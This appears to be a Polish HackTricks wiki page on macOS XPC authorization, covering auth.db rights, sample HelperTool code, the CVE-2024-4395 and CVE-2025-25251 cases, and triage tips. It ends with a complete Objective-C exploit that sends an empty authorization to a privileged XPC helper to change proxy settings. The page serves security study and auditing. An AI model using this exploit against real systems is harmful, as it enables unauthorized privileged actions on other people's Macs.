# macOS XPC Autoryzacja

{{#include ../../../../../banners/hacktricks-training.md}}

## Autoryzacja XPC

Apple proponuje także inny sposób uwierzytelniania, jeśli proces łączący się ma **uprawnienia do wywołania udostępnionej metody XPC**.

Kiedy aplikacja musi **wykonywać akcje jako uprzywilejowany użytkownik**, zamiast uruchamiać aplikację jako uprzywilejowanego użytkownika zwykle instaluje jako root HelperTool jako usługę XPC, którą aplikacja może wywołać, aby wykonać te akcje. Jednak aplikacja wywołująca usługę powinna mieć wystarczającą autoryzację.

### ShouldAcceptNewConnection zawsze YES

Przykład można znaleźć w [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). W `App/AppDelegate.m` próbuje **połączyć się** z **HelperTool**. A w `HelperTool/HelperTool.m` funkcja **`shouldAcceptNewConnection`** **nie będzie sprawdzać** żadnego z wcześniej wskazanych wymagań. Zawsze zwróci YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Aby uzyskać więcej informacji o tym, jak poprawnie skonfigurować tę kontrolę:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Uprawnienia aplikacji

Jednak występuje pewna **autoryzacja przy wywołaniu metody z HelperTool**.

Funkcja **`applicationDidFinishLaunching`** z `App/AppDelegate.m` utworzy pustą referencję autoryzacji po uruchomieniu aplikacji. To powinno zawsze działać.\
Następnie spróbuje **dodać pewne prawa** do tej referencji autoryzacji, wywołując `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcja `setupAuthorizationRights` z `Common/Common.m` zapisze w bazie autoryzacji `/var/db/auth.db` prawa aplikacji. Zwróć uwagę, że doda tylko te prawa, które jeszcze nie znajdują się w bazie danych:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcja `enumerateRightsUsingBlock` jest używana do pobierania uprawnień aplikacji, które są zdefiniowane w `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
To oznacza, że na końcu tego procesu uprawnienia zadeklarowane wewnątrz `commandInfo` zostaną zapisane w `/var/db/auth.db`. Zwróć uwagę, że możesz tam znaleźć dla **każdej metody**, która będzie **wymagać uwierzytelnienia**, **nazwę uprawnienia** oraz **`kCommandKeyAuthRightDefault`**. To ostatnie **wskazuje, kto może uzyskać to prawo**.

Istnieją różne zakresy określające, kto może uzyskać prawo. Niektóre z nich są zdefiniowane w [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), ale w skrócie:

<table><thead><tr><th width="284.3333333333333">Nazwa</th><th width="165">Value</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Każdy</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nikt</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Aktualny użytkownik musi być administratorem (w grupie admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Poproś użytkownika o uwierzytelnienie.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Poproś użytkownika o uwierzytelnienie. Musi być administratorem (w grupie admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Określa reguły</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Dodaje dodatkowy komentarz do prawa</td></tr></tbody></table>

### Weryfikacja praw

W `HelperTool/HelperTool.m` funkcja **`readLicenseKeyAuthorization`** sprawdza, czy caller jest autoryzowany do **wywołania takiej metody**, wywołując funkcję **`checkAuthorization`**. Funkcja ta sprawdzi, czy **authData** wysłane przez proces wywołujący ma **prawidłowy format**, a następnie sprawdzi, **co jest potrzebne, aby uzyskać prawo** do wywołania konkretnej metody. Jeśli wszystko pójdzie dobrze, **zwracany `error` będzie `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Zwróć uwagę, że aby **sprawdzić wymagania potrzebne do uzyskania prawa** do wywołania tej metody funkcja `authorizationRightForCommand` sprawdzi jedynie wcześniej wspomniany obiekt **`commandInfo`**. Następnie wywoła **`AuthorizationCopyRights`**, aby sprawdzić **czy ma prawa** do wywołania tej funkcji (uwaga: flagi pozwalają na interakcję z użytkownikiem).

W tym przypadku, aby wywołać funkcję `readLicenseKeyAuthorization` `kCommandKeyAuthRightDefault` jest zdefiniowane jako `@kAuthorizationRuleClassAllow`. Zatem **każdy może ją wywołać**.

### Informacje o bazie danych

Wspomniano, że te informacje są przechowywane w `/var/db/auth.db`. Wszystkie zapisane reguły można wyświetlić za pomocą:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Następnie możesz odczytać, kto ma dostęp do tego uprawnienia za pomocą:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Uprawnienia permisywne

Możesz znaleźć **wszystkie konfiguracje uprawnień** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), ale kombinacje, które nie będą wymagać interakcji użytkownika, to:

1. **'authenticate-user': 'false'**
- To jest najbardziej bezpośredni klucz. Jeśli ustawiony na `false`, określa, że użytkownik nie musi podawać uwierzytelnienia, aby uzyskać to prawo.
- Jest to używane w **połączeniu z jednym z dwóch poniższych lub wskazaniem grupy**, do której użytkownik musi należeć.
2. **'allow-root': 'true'**
- Jeśli użytkownik działa jako root (który ma podwyższone uprawnienia), a ten klucz jest ustawiony na `true`, użytkownik root może potencjalnie uzyskać to prawo bez dalszego uwierzytelniania. Jednak zazwyczaj uzyskanie statusu root już wymaga uwierzytelnienia, więc dla większości użytkowników nie jest to scenariusz „braku uwierzytelnienia”.
3. **'session-owner': 'true'**
- Jeśli ustawione na `true`, właściciel sesji (aktualnie zalogowany użytkownik) automatycznie otrzyma to prawo. Może to pominąć dodatkowe uwierzytelnianie, jeśli użytkownik jest już zalogowany.
4. **'shared': 'true'**
- Ten klucz nie przyznaje praw bez uwierzytelnienia. Zamiast tego, jeśli ustawiony na `true`, oznacza, że po uwierzytelnieniu prawo może być współdzielone między wieloma procesami bez konieczności ponownego uwierzytelniania każdego z nich. Jednak początkowe przyznanie prawa nadal będzie wymagać uwierzytelnienia, chyba że zostanie połączone z innymi kluczami jak `'authenticate-user': 'false'`.

Możesz [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Studia przypadków obejścia autoryzacji

- **CVE-2024-4395 – Jamf Compliance Editor helper**: Uruchomienie audytu umieszcza `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, ujawnia usługę Mach `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez weryfikacji `AuthorizationExternalForm` wywołującego ani podpisu kodu. Trywialny exploit wywołuje `AuthorizationCreate`, tworzy puste odniesienie, łączy się za pomocą `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i wywołuje metodę, aby uruchomić dowolne binaria jako root. Szczegółowe notatki z reverse engineeringu (plus PoC) w [opisie Mykoly Grymalyuka](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 i 7.4.0–7.4.2 akceptowały spreparowane wiadomości XPC, które docierały do uprzywilejowanego helpera pozbawionego mechanizmów autoryzacji. Ponieważ helper ufał własnemu uprzywilejowanemu `AuthorizationRef`, każdy lokalny użytkownik mogący wysłać wiadomość do usługi mógł zmusić ją do wykonania dowolnych zmian konfiguracji lub poleceń jako root. Szczegóły w [podsumowaniu SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Szybkie wskazówki do wstępnej oceny

- Gdy aplikacja zawiera zarówno GUI, jak i helpera, porównaj ich wymagania podpisu kodu i sprawdź, czy `shouldAcceptNewConnection` blokuje listener przy pomocy `-setCodeSigningRequirement:` (lub waliduje `SecCodeCopySigningInformation`). Brakujące sprawdzenia zwykle prowadzą do scenariuszy typu CWE-863, jak w przypadku Jamf. Szybkie spojrzenie wygląda tak:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Porównaj, co proces pomocniczy *sądzi*, że autoryzuje, z tym, co dostarcza klient. Podczas reverse engineeringu ustaw breakpoint w `AuthorizationCopyRights` i potwierdź, że `AuthorizationRef` pochodzi z `AuthorizationCreateFromExternalForm` (dostarczone przez klienta) zamiast z uprzywilejowanego kontekstu procesu pomocniczego; w przeciwnym razie prawdopodobnie znalazłeś wzorzec CWE-863 podobny do powyższych przypadków.

## Analiza autoryzacji

### Sprawdzanie, czy używany jest EvenBetterAuthorization

Jeśli znajdziesz funkcję: **`[HelperTool checkAuthorization:command:]`**, prawdopodobnie proces używa wcześniej wspomnianego schematu autoryzacji:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Jeśli ta funkcja wywołuje funkcje takie jak `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, to korzysta z [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Sprawdź **`/var/db/auth.db`**, aby zobaczyć, czy można uzyskać uprawnienia do wywołania jakiejś uprzywilejowanej akcji bez interakcji użytkownika.

### Protocol Communication

Następnie musisz znaleźć schemat protokołu, aby móc nawiązać komunikację z usługą XPC.

Funkcja **`shouldAcceptNewConnection`** wskazuje eksportowany protokół:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

W tym przypadku mamy to samo co w EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Znając nazwę używanego protokołu, można **zrzucić jego definicję nagłówka** za pomocą:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na koniec musimy tylko znać **nazwę udostępnionej Mach Service**, aby nawiązać z nią komunikację. Istnieje kilka sposobów, aby ją znaleźć:

- W **`[HelperTool init]`**, gdzie widać, która Mach Service jest używana:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- W launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Przykład

W tym przykładzie tworzony jest:

- Definicja protokołu z funkcjami
- Pusty auth do użycia przy żądaniu dostępu
- Połączenie z usługą XPC
- Wywołanie funkcji, jeśli połączenie się powiodło
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Inne helpery przywilejów XPC wykorzystywane

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Źródła

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
